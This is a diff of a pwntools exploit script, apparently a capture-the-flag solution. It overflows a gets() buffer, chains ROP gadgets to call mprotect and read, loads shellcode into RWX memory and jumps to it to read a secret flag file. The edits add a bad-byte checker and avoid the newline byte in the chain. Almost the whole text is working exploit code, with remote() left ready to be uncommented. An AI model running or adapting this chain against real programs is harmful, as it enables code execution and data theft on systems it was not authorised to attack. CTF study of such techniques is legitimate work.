@@ -15,23 +15,24 @@ pop_rax = p64(0x449857)  # pop rax; ret
 pop_rdi = p64(0x40191a)  # pop rdi; ret
 pop_rsi = p64(0x40f55e)  # pop rsi; ret
 pop_rdx = p64(0x40181f)  # pop rdx; ret
-add_rax_rdi = p64(0x42a403)  # add rax, rdi; ret
 syscall = p64(0x485ac9)  # syscall; ret
+add_rax_rdi = p64(0x42a403)  # add rax, rdi; ret
 
 
-def local(debug, wsl2):
-    p = process(file_binary)
+def run_local(debug = True, wsl2 = True):
+    p = process([f"./{file_binary}"])
+    pid = util.proc.pidof(p)[0]
     if debug == False:
         return p
     if wsl2 == False:  # Debug in Linux
-        print("Waiting for debugger...")
+        log.info(f"Waiting for GDB...\n"
+                 f"$ gdb -q -p {pid}")
         pause()
         return p
 
     # Debug in WSL2
-    pid = util.proc.pidof(p)[0]
     gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
-    print(f"Gdb uses breakpoints from {file_breakpoints}")
+    log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
 
     new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
     wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
@@ -39,6 +40,21 @@ def local(debug, wsl2):
     os.system(cmd)
     util.proc.wait_for_debugger(pid)
     return p
+
+
+def find_bad_bytes(buf, bad_bytes = None):
+    if bad_bytes is None:
+        bad_bytes = [
+            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
+        ]
+    found = False
+    for i, byte in enumerate(buf):
+        if byte in bad_bytes:
+            log.warn(f"Bad byte '{hex(byte)}' at {i}")
+            found = True
+    if found:
+        print(hexdump(buf, highlight = bad_bytes))
+        log.error("Found bad bytes in a buffer!")
 
 
 # SET REGISTER
@@ -75,14 +91,12 @@ def sys_mprotect(address, length, protection):
     num_mprotect = 10
     buf = b""
 
-    # rax = 10
+    # rax = 10 = 0xa
     buf += pop_rax
-    buf += p64(5)
+    buf += p64(9)
     buf += pop_rdi
-    buf += p64(5)
+    buf += p64(1)
     buf += add_rax_rdi
-
-    # buf += set_rax(num_mprotect)
 
     buf += set_rdi(address)
     buf += set_rsi(length)
@@ -106,8 +120,6 @@ def sys_read(fd, address, length):
 
 
 def main():
-    p = local(True, True)
-    # p = remote(IP, PORT)
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
     # Buffer overflow (with return address overwriting)
@@ -124,9 +136,13 @@ def main():
     # read()
     stdin_fd = 0
     buf += sys_read(stdin_fd, rwx_addr, len(sc))
+    buf += p64(rwx_addr)  # Jump to RWX buffer
 
-    # Jump to buf
-    buf += p64(rwx_addr)
+    find_bad_bytes(buf)
+
+    # RUN PROCESS
+    p = run_local(debug = True, wsl2 = True)
+    # p = remote(IP, PORT)
 
     log.info("=== buffer")
     print(hexdump(buf))
@@ -138,7 +154,6 @@ def main():
     log.info("=== shellcode")
     print(hexdump(sc))
     p.writeline(sc)
-
     flag = p.readall().strip().decode()
     log.success(f"FLAG = {flag}")
 
